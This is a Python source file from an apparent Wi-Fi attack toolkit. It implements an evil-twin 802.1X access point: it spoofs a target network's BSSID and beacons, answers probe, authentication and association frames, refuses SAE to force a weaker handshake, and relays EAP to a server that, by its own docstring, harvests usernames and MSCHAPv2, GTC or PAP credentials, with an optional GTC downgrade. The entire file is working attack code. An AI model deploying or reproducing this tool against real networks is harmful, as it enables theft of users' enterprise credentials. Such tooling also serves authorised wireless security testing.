"""EnterpriseFakeAP: the rogue 802.1X access point (beacon + responder + per-client EAP server).

Beacons a WPA2/WPA3-Enterprise twin, answers probe/auth/assoc, and relays EAPOL-EAP frames to a
per-client ``EapServer`` that harvests the identity and the MSCHAPv2 / GTC / PAP credential. Emits
nothing to the UI; the campaign polls ``stats`` and is handed each capture via ``on_capture``.
"""
from __future__ import annotations

import asyncio
import logging
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, Optional

from wifit3.dot11.ap import assoc_resp, auth_resp
from wifit3.dot11.eap_build import eap_from_frame, eapol_eap_frame, is_eapol_start
from wifit3.dot11.ie import iter_information_elements
from wifit3.dot11.mac import mac_to_str
from wifit3.campaigns.eviltwin_enterprise.eap_server import Capture, EapServer, Method
from wifit3.campaigns.eviltwin_enterprise.tls import server_context

logger = logging.getLogger(__name__)

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000
_BEACON_BODY = 36
_ELEMID_TIM = 5
_AUTH_ALG_SAE = 3
_STATUS_NOT_SUPPORTED_AUTH_ALG = 13
_SEQ_SPACE = 0x1000                     # 802.11 sequence number is 12 bits
_SESSION_TTL_S = 60.0                   # forget a client's EAP state after this idle span
_REAP_PERIOD_S = 30.0


@dataclass
class EnterpriseStats:
    probes_direct: int = 0
    probes_wildcard: int = 0
    auth: int = 0
    assoc: int = 0
    eapol_starts: int = 0
    identities: int = 0
    credentials: int = 0
    clients: Dict[str, str] = field(default_factory=dict)       # client MAC -> last known username


class EnterpriseFakeAP:
    def __init__(self, iface, bssid: bytes, ssid: str, channel: int, twin_beacon: bytes, *,
                 method: Method = Method.PEAP, gtc_downgrade: bool = False, rx_source=None,
                 on_capture: Optional[Callable[[Capture], None]] = None,
                 server_name: str = "wifit3", cert_path: Optional[str] = None,
                 on_event: Optional[Callable[[str], None]] = None) -> None:
        self.iface = iface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.twin_beacon = twin_beacon
        self.method = method
        self.gtc_downgrade = gtc_downgrade
        self.rx_source = rx_source
        self.on_capture = on_capture or (lambda _c: None)
        self.on_event = on_event or (lambda _m: None)
        self.server_name = server_name
        self.stats = EnterpriseStats()
        self._context = server_context(cert_path)              # one cert, shared by every client
        self._servers: Dict[str, EapServer] = {}
        self._last_seen: Dict[str, float] = {}                 # client MAC -> monotonic timestamp
        self._recorded: set[tuple[str, str]] = set()
        self._credentialed: set[str] = set()                   # clients whose credential we already have
        self._probe_resp = self._probe_resp_from(twin_beacon)
        self._running = False
        self._fake_mac_armed = False
        self._rx_registered = False
        self._seq = 0
        self._last_reap = time.monotonic()
        self._beacon_task: Optional[asyncio.Task] = None

    # ----- lifecycle ---------------------------------------------------------

    async def start(self) -> None:
        if self.iface.current_channel != self.channel:
            await self.iface.set_channel(self.channel)
        armed = await self.iface.set_fake_mac(self.bssid, self.bssid)
        self._fake_mac_armed = armed is not None
        if self.rx_source is not None:
            self.rx_source.register_rx_callback(self.on_rx)
            self._rx_registered = True
        self._running = True
        self._beacon_task = asyncio.create_task(self._beacon_loop())

    async def stop(self) -> None:
        self._running = False
        error = None
        if self._rx_registered:
            self._rx_registered = False
            try:
                self.rx_source.unregister_rx_callback(self.on_rx)
            except Exception as exc:                            # noqa: BLE001
                error = exc
        task, self._beacon_task = self._beacon_task, None
        if task is not None:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as exc:                            # noqa: BLE001
                error = error or exc
        if self._fake_mac_armed:
            self._fake_mac_armed = False
            try:
                await self.iface.clear_fake_mac()
            except Exception as exc:                            # noqa: BLE001
                error = error or exc
        if error is not None:
            raise error

    async def _beacon_loop(self) -> None:
        failing = False
        while self._running:
            try:
                await self.iface.send_no_wait(self._with_seq(self._restamp(self.twin_beacon)))
                failing = False
            except Exception:
                if not failing:
                    logger.exception("EnterpriseFakeAP beacon send failed; still beaconing")
                failing = True
            self._reap_idle_sessions()
            await asyncio.sleep(_BEACON_PERIOD_S)

    def _reap_idle_sessions(self) -> None:
        """Drop the per-client EAP state (TLS tunnels, buffers) of clients gone idle, so a long run
        or a spraying station cannot grow the server map without bound. Capture results are kept."""
        now = time.monotonic()
        if now - self._last_reap < _REAP_PERIOD_S:
            return
        self._last_reap = now
        stale = [cs for cs, last_seen in self._last_seen.items() if now - last_seen >= _SESSION_TTL_S]
        for cs in stale:
            self._last_seen.pop(cs, None)
            self._servers.pop(cs, None)
            self._credentialed.discard(cs)

    @staticmethod
    def _probe_resp_from(beacon: bytes) -> bytes:
        elements = b"".join(raw for tag, _body, raw in iter_information_elements(beacon, _BEACON_BODY)
                            if tag != _ELEMID_TIM)
        return b"\x50\x00" + beacon[2:4] + b"\x00" * 6 + beacon[10:_BEACON_BODY] + elements

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]

    # ----- responder ---------------------------------------------------------

    def on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 24:
            return
        client = raw[10:16]
        to_us = raw[4:10] == self.bssid
        if pkt.type == "eap":
            if to_us:
                self._on_eap(client, raw)
            return
        if pkt.type == "eapol":
            if to_us and is_eapol_start(raw):
                self._on_eapol_start(client)
            return
        if pkt.type_id != 0:
            return
        subtype = pkt.subtype_id
        if subtype == 0x04:
            self._on_probe(pkt, client)
        elif not to_us:
            return
        elif subtype == 0x0B:
            self._on_auth(raw, client)
        elif subtype in (0x00, 0x02):
            self._on_assoc(pkt, client)

    def _on_probe(self, pkt, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None)
        if ssid in (None, "", "<hidden>"):
            self.stats.probes_wildcard += 1
        elif ssid == self.ssid:
            self.stats.probes_direct += 1
        else:
            return
        self._tx(self._restamp(self._probe_resp[:4] + client + self._probe_resp[10:]))

    def _mark_seen(self, client: bytes) -> None:
        self._last_seen[mac_to_str(client)] = time.monotonic()

    def _on_auth(self, raw: bytes, client: bytes) -> None:
        self.stats.auth += 1
        self._mark_seen(client)
        if int.from_bytes(raw[24:26], "little") == _AUTH_ALG_SAE:
            self._tx(auth_resp(self.bssid, client, algorithm=_AUTH_ALG_SAE,
                               status=_STATUS_NOT_SUPPORTED_AUTH_ALG))
            return
        self._tx(auth_resp(self.bssid, client))

    def _on_assoc(self, pkt, client: bytes) -> None:
        self.stats.assoc += 1
        self._mark_seen(client)
        reassoc = pkt.subtype_id == 0x02
        self._tx(assoc_resp(self.bssid, client, channel=self.channel, reassoc=reassoc,
                            twin_beacon=self.twin_beacon))
        self._begin_eap(client)                                # authenticator prompts for identity

    def _on_eapol_start(self, client: bytes) -> None:
        self.stats.eapol_starts += 1
        self._mark_seen(client)
        self._begin_eap(client)

    def _new_server(self, cs: str) -> EapServer:
        short = cs.replace(":", "")[-4:]                       # last 2 octets, to tag the client

        def emit(message: str) -> None:
            # A client whose credential we already captured keeps re-authenticating (the post-EAP
            # 4-way always fails on a rogue AP); handle those rounds silently so the log stays clean.
            if cs not in self._credentialed:
                self.on_event(f"[{short}] {message}")

        server = EapServer(self.ssid, method=self.method, gtc_downgrade=self.gtc_downgrade,
                           context=self._context, server_name=self.server_name, on_event=emit)
        self._servers[cs] = server
        return server

    def _begin_eap(self, client: bytes) -> None:
        self._emit(client, self._new_server(mac_to_str(client)).start())

    def _on_eap(self, client: bytes, raw: bytes) -> None:
        cs = mac_to_str(client)
        if cs not in self._servers and cs not in self._last_seen:
            return                                             # EAP from a station that never associated
        message = eap_from_frame(raw)
        if message is None:
            return
        self._mark_seen(client)
        server = self._servers.get(cs)
        if server is None:
            server = self._new_server(cs)
        try:
            outgoing = server.receive(message)
        except Exception:
            logger.exception("EnterpriseFakeAP EAP server fault for %s", mac_to_str(client))
            outgoing = []
        self._record(client, server)
        self._emit(client, outgoing)

    def _record(self, client: bytes, server: EapServer) -> None:
        cap = server.captured
        if cap is None:
            return
        if cap.username:
            self.stats.clients[mac_to_str(client)] = cap.username
        key = (mac_to_str(client), cap.inner_method)
        if key in self._recorded:
            return
        self._recorded.add(key)
        if cap.inner_method == "Identity":
            self.stats.identities += 1
        else:
            self.stats.credentials += 1
            self._credentialed.add(mac_to_str(client))         # silence this client's later re-auths
        self.on_capture(cap)

    def _emit(self, client: bytes, eap_packets: list) -> None:
        for eap in eap_packets:
            self._tx(eapol_eap_frame(self.bssid, client, eap))

    def _tx(self, *frames: bytes) -> None:
        asyncio.create_task(self._send_in_order(frames))

    async def _send_in_order(self, frames) -> None:
        for frame in frames:
            await self.iface.send_no_wait(self._with_seq(frame))

    def _with_seq(self, frame: bytes) -> bytes:
        """Stamp the next 802.11 sequence number (fragment 0) into the header, so real clients and
        their duplicate-detection do not drop our frames as repeats of a zero-sequence frame."""
        if len(frame) < 24:
            return frame
        seq_ctrl = struct.pack("<H", self._seq << 4)
        self._seq = (self._seq + 1) % _SEQ_SPACE
        return frame[:22] + seq_ctrl + frame[24:]
